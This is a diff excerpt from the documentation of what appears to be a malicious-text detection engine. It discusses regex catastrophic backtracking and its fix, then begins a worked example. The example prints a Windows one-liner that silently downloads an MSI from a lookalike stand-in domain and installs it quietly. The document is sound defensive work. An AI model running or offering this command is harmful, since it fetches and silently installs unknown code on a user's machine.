@@ -79,7 +79,7 @@ Very long text is never simply allowed. The engine checks up to 200,000 characte
 
 Some regular expressions get very slow on unlucky input. `\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.top` looks innocent, but on text like `a.a.a.a.a...` it tries every way of splitting the dots, again from every starting point. In v0.2 four patterns took over 40 seconds each on 200,000 characters made for this (this is called *catastrophic backtracking*). The fix is to give every repeat a sensible upper limit, like `{1,63}` for one part of a web address, which is also the real limit in DNS, and to start matching only at the beginning of a word. A test now runs every pattern against hostile text and fails if one is slow.
 
-### Worked example: the command shape from the incident
+### Worked example: a command shape seen in a real attack
 
 ```
 cmd /c curl -s -o %TEMP%\S775.msi https://cloubflare.example.top/5 && msiexec /i %TEMP%\S775.msi /qn
